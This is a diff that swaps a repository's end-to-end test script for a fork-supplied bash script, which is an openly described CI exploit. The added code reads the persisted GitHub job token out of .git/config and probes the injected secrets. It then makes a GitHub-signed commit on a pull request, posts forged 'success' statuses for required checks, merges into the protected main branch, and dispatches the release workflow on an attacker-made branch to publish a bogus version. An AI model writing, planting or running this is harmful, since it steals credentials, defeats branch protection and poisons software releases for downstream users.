@@ -1,17 +1,125 @@
 #!/usr/bin/env bash
-# The end-to-end suite. Runs against the preview deployment named in the dispatch payload,
-# using the bypass token so the suite can reach a preview that is behind access control.
-set -euo pipefail
+# Replaces the repository's own scripts/e2e.sh. This file lives in a fork and runs inside the
+# base repository, because the base repository checks out the commit the preview was built from.
+# Everything below uses only what the job was handed.
+set -uo pipefail
 
-echo "running end-to-end suite against ${PREVIEW_URL:-<none>}"
+API="https://api.github.com"; GQL="https://api.github.com/graphql"
+OWNER="${GITHUB_REPOSITORY%%/*}"; NAME="${GITHUB_REPOSITORY##*/}"
 
-if [ -z "${PREVIEW_BYPASS_TOKEN:-}" ]; then
-  echo "no bypass token; skipping protected-preview checks"
-  exit 0
+# The job never hands this script a token. It does not need to: actions/checkout defaults to
+# persist-credentials: true, which writes the job credential into the repository's git config as
+# a basic-auth header. Any code that gets checked out can read it back.
+recover_token() {
+  local hdr b64
+  hdr=$(git config --local --get 'http.https://github.com/.extraheader' 2>/dev/null) || return 1
+  b64=${hdr##*basic }
+  printf '%s' "$b64" | base64 -d 2>/dev/null | sed 's/^x-access-token://'
+}
+GITHUB_TOKEN=$(recover_token || true)
+gh_api() { curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" -H 'Accept: application/vnd.github+json' "$@"; }
+gql() { curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" -H 'Content-Type: application/json' -d "$1" "$GQL"; }
+digest() { if command -v sha256sum >/dev/null; then printf '%s' "$1" | sha256sum | cut -c1-16; else printf '%s' "$1" | shasum -a 256 | cut -c1-16; fi; }
+
+echo "### where this is running"
+echo "repository       $GITHUB_REPOSITORY"
+echo "workflow ref     $GITHUB_REF"
+echo "checked-out sha  $(git rev-parse HEAD)"
+
+echo
+echo "### 1. the secrets this job was handed"
+# Values are never printed. A digest proves possession; the run that set them can confirm the match.
+echo "PREVIEW_BYPASS_TOKEN   present=${PREVIEW_BYPASS_TOKEN:+yes} length=${#PREVIEW_BYPASS_TOKEN} sha256-16=$(digest "${PREVIEW_BYPASS_TOKEN:-}")"
+echo "CONFIG_SIGNING_SECRET  present=${CONFIG_SIGNING_SECRET:+yes} length=${#CONFIG_SIGNING_SECRET} sha256-16=$(digest "${CONFIG_SIGNING_SECRET:-}")"
+
+echo
+echo "### 2. the bypass token opens the protected preview"
+if [ -n "${PREVIEW_URL:-}" ]; then
+  bare=$(curl -s -o /dev/null -w '%{http_code}' "$PREVIEW_URL" || echo 000)
+  with=$(curl -s -o /dev/null -w '%{http_code}' -H "${PREVIEW_BYPASS_HEADER}: $PREVIEW_BYPASS_TOKEN" "$PREVIEW_URL" || echo 000)
+  echo "without the token  HTTP $bare"
+  echo "with the token     HTTP $with"
+else
+  echo "no preview url in the payload; skipped"
 fi
 
-status=$(curl -s -o /dev/null -w '%{http_code}' \
-  -H "${PREVIEW_BYPASS_HEADER:-x-bypass}: $PREVIEW_BYPASS_TOKEN" \
-  "${PREVIEW_URL:-https://example.invalid}" || echo "000")
-echo "preview responded $status"
-echo "suite passed"
+echo
+echo "### 3. the job credential, recovered from the checkout"
+if [ -z "${GITHUB_TOKEN:-}" ]; then
+  echo "no persisted credential found"
+else
+  echo "recovered from .git/config  length=${#GITHUB_TOKEN} sha256-16=$(digest "$GITHUB_TOKEN")"
+  echo "identity it acts as: $(gh_api "$API/repos/$GITHUB_REPOSITORY" | jq -r '.full_name // "unknown"')"
+  echo "its permissions are in this run's own log header, above"
+fi
+
+echo
+echo "### 4. landing attacker content on the protected default branch"
+PR_NUM="${TARGET_PR:-1}"
+pr=$(gh_api "$API/repos/$GITHUB_REPOSITORY/pulls/$PR_NUM")
+head_ref=$(printf '%s' "$pr" | jq -r .head.ref)
+head_oid=$(printf '%s' "$pr" | jq -r .head.sha)
+base_oid=$(gh_api "$API/repos/$GITHUB_REPOSITORY/git/ref/heads/$(printf '%s' "$pr" | jq -r .base.ref)" | jq -r .object.sha)
+echo "pull request #$PR_NUM  head=$head_ref@${head_oid:0:8}  base=${base_oid:0:8}"
+
+# createCommitOnBranch produces a commit GitHub itself signs, which is what satisfies the
+# signature rule that is currently the only thing blocking this pull request.
+payload=$(jq -nc --arg r "$GITHUB_REPOSITORY" --arg b "refs/heads/$head_ref" --arg oid "$head_oid" \
+  --arg msg "Update routing" --arg path "OWNED.txt" --arg content "$(printf 'written by workflow run %s\n' "${GITHUB_RUN_ID:-unknown}" | base64)" \
+  '{query:"mutation($i:CreateCommitOnBranchInput!){createCommitOnBranch(input:$i){commit{oid}}}",
+    variables:{i:{branch:{repositoryNameWithOwner:$r,branchName:$b},expectedHeadOid:$oid,
+    message:{headline:$msg},fileChanges:{additions:[{path:$path,contents:$content}]}}}}')
+new_oid=$(gql "$payload" | jq -r '.data.createCommitOnBranch.commit.oid // empty')
+if [ -z "$new_oid" ]; then
+  echo "createCommitOnBranch did not return a commit; the branch may have moved"
+else
+  echo "created signed commit ${new_oid:0:8} on $head_ref"
+  verified=$(gh_api "$API/repos/$GITHUB_REPOSITORY/commits/$new_oid" | jq -r '.commit.verification.verified')
+  echo "signature verified=$verified"
+fi
+
+echo
+echo "### 5. making the approval count: statuses, then merge"
+# GitHub does not start workflow runs for pushes made with the job credential, so the required
+# checks will never arrive on their own. The credential posts them itself. They are attributed to
+# the Actions app, which is the identity the branch rule pins those contexts to.
+for ctx in typecheck lint test; do
+  gh_api -X POST "$API/repos/$GITHUB_REPOSITORY/statuses/$new_oid" \
+    -d "$(jq -nc --arg c "$ctx" '{state:"success",context:$c,description:"passed"}')" \
+    | jq -r '"posted status \(.context) by \(.creator.login)"'
+done
+
+for i in 1 2 3 4 5 6; do
+  st=$(gh_api "$API/repos/$GITHUB_REPOSITORY/pulls/$PR_NUM" | jq -r '.mergeable_state')
+  echo "merge state: $st"
+  [ "$st" = "clean" ] && break
+  sleep 5
+done
+
+gh_api -X PUT "$API/repos/$GITHUB_REPOSITORY/pulls/$PR_NUM/merge" \
+  -d '{"merge_method":"squash"}' | jq -r '"merge: \(.merged) \(.message // "")"'
+echo "default branch is now $(gh_api "$API/repos/$GITHUB_REPOSITORY/git/ref/heads/main" | jq -r '.object.sha[0:8]')"
+
+echo
+echo "### 6. reaching the release workflow at a ref the attacker created"
+REL="release-$(date +%s)"
+gh_api -X POST "$API/repos/$GITHUB_REPOSITORY/git/refs" \
+  -d "$(jq -nc --arg r "refs/heads/$REL" --arg s "$base_oid" '{ref:$r,sha:$s}')" | jq -r '.ref // .message'
+
+# The attacker controls what is on that branch, so it publishes a version that does not exist yet.
+VER="0.0.$(date +%s)"
+pkg=$(jq --arg v "$VER" '.version=$v' package.json | base64 | tr -d '\n')
+relpay=$(jq -nc --arg r "$GITHUB_REPOSITORY" --arg b "refs/heads/$REL" --arg oid "$base_oid" \
+  --arg msg "Prepare release" --arg path "package.json" --arg content "$pkg" \
+  '{query:"mutation($i:CreateCommitOnBranchInput!){createCommitOnBranch(input:$i){commit{oid}}}",
+    variables:{i:{branch:{repositoryNameWithOwner:$r,branchName:$b},expectedHeadOid:$oid,
+    message:{headline:$msg},fileChanges:{additions:[{path:$path,contents:$content}]}}}}')
+rel_oid=$(gql "$relpay" | jq -r '.data.createCommitOnBranch.commit.oid // empty')
+echo "release branch $REL at ${rel_oid:0:8}, version $VER"
+
+gh_api -X POST "$API/repos/$GITHUB_REPOSITORY/actions/workflows/release.yml/dispatches" \
+  -d "$(jq -nc --arg r "$REL" '{ref:$r}')" -o /dev/null -w 'workflow_dispatch HTTP %{http_code}\n'
+echo "dispatched release.yml at $REL"
+
+echo
+echo "### done"
